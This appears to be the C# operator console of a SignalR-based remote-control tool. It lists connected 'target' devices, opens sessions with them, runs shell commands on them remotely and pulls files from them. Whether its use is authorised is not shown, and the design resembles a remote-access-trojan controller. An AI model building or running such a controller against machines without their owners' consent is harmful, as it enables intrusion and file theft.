using Microsoft.AspNetCore.SignalR.Client;

using Scalax_admin.CONSTANTS;
using Scalax_admin.CMDS;
using Scalax_admin.FUNCS;



HubConnection HC = new HubConnectionBuilder()
    .WithUrl($"{CONSTANTS.SERVER_ENDPOINT_URL}/Hubs/communicate")
    .WithAutomaticReconnect()
    .Build()
    ;

HC.StartAsync().Wait();

string? conID = HC?.ConnectionId;


async Task RecordConnection()
{
    if (HC is null) return;

    await HC.SendAsync("Init", "|_.-/", HC.ConnectionId, true);
}

RecordConnection().Wait();


var IS_SESSION_ACTIVE = false;
string ACTIVE_SESSION__ID = string.Empty;
string ACTIVE_SESSION__TARGET_DEVICE_USER_NAME = string.Empty;

string CURR_ACTIVE_CMD_DIR = @"C:\";



async Task COMMAND(string cmd)
{

    if (cmd.StartsWith("cmd") || cmd.StartsWith("pull"))
    {
        string[] txts = cmd.Replace("  ", " ").Split('|');
        //await HC.SendAsync("ExecCmdOnOne", cmd.Split("-t").ElementAtOrDefault(1), cmd.Split("-c").ElementAtOrDefault(1));
        await HC.SendAsync("ExecCmdOnOne", txts[1], txts[2]);
        HC.On("GetExecCmdOnOneRes", (string cmdRes) =>
        {
            Console.Write(cmdRes);
            ACTIVE_SESSION__TARGET_DEVICE_USER_NAME = cmdRes.Split("::").ElementAt(0).Replace(" ", string.Empty) ?? "#";
            HC.Remove("GetExecCmdOnOneRes");
        });

        return;
    }


    Console.WriteLine("Wrong command!");

}



string? cmd;
string? cmdPyload;
void AskForCmdInput()
{
    if (IS_SESSION_ACTIVE) Console.WriteLine($"{ACTIVE_SESSION__TARGET_DEVICE_USER_NAME}@{CURR_ACTIVE_CMD_DIR}>");
    cmd = Console.ReadLine();
    cmdPyload = !IS_SESSION_ACTIVE ? Console.ReadLine() : string.Empty;

    var HA = (HC, AC: new Action(() => AskForCmdInput()));


    switch (cmd)
    {

        case APP_CMDS.GetAllActiveConnections :
            APP_FUNCS.GetAllActiveConnections(HA.HC, HA.AC);
            break;

        case APP_CMDS.ExecCmdPullFile :
            APP_FUNCS.PullFile(HA.HC, HA.AC, cmdPyload.Split('|')[0], cmdPyload.Split('|')[1].Split('.')[1], cmdPyload.Split('|')[1]);
            break;

        case APP_CMDS.StartSession:
            APP_FUNCS.StartSessionWithTarget(HA.HC, HA.AC, cmdPyload, out IS_SESSION_ACTIVE, out ACTIVE_SESSION__ID);
            break;
        case APP_CMDS.EndSession :
            APP_FUNCS.EndSessionWithTarget(HA.HC, HA.AC, cmdPyload, out IS_SESSION_ACTIVE, out ACTIVE_SESSION__ID);
            break;


        default:
            //Console.WriteLine("Wrong command !");
            if (!IS_SESSION_ACTIVE) COMMAND(cmd).Wait(); else APP_FUNCS.FireSessionTargetedCmd(HA.HC, HA.AC, ACTIVE_SESSION__ID, cmd, CURR_ACTIVE_CMD_DIR, out CURR_ACTIVE_CMD_DIR, (IS_SESSION_ACTIVE && cmd.Contains("cd")) ? cmd.Replace("cd", string.Empty) : CURR_ACTIVE_CMD_DIR);
            AskForCmdInput();
            break;
    }


}
AskForCmdInput();


////


Thread.Sleep(-1);